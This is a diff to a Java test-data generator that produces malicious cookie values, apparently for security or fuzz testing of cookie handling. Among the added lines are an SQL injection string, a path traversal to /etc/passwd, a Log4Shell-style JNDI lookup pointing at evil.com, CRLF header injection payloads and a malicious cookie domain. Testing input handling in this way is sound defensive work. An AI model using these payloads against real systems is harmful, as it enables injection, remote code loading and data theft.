@@ -71,6 +71,12 @@ public class CookieGenerator implements TypedGenerator<Cookie> {
         if (callCounter % 50 == 12) return new Cookie("cookie=equals", generateSafeValue(), generateAttributes());
         if (callCounter % 50 == 13) return new Cookie(generateStandardCookieName(), "\r\n\r\nHTTP/1.1 200 OK", generateAttributes());
         if (callCounter % 50 == 14) return new Cookie(generateStandardCookieName(), "\r\nSet-Cookie: injected=value", generateAttributes());
+        if (callCounter % 50 == 15) return new Cookie(generateStandardCookieName(), "'; DROP TABLE users; --", generateAttributes());
+        if (callCounter % 50 == 16) return new Cookie(generateStandardCookieName(), "../../../etc/passwd", generateAttributes());
+        if (callCounter % 50 == 17) return new Cookie(generateStandardCookieName(), "${jndi:ldap://evil.com/}", generateAttributes());
+        if (callCounter % 50 == 18) return new Cookie(generateStandardCookieName(), Generators.letterStrings(5000, 6000).next(), generateAttributes()); // Very long value
+        if (callCounter % 50 == 19) return new Cookie(generateStandardCookieName(), "value%0d%0aSet-Cookie: injected=1", generateAttributes()); // Encoded header injection
+        if (callCounter % 50 == 20) return new Cookie(generateStandardCookieName(), generateSafeValue(), "Domain=.evil.com; Path=/"); // Malicious domain
 
         int type = cookieTypeGenerator.next();
 
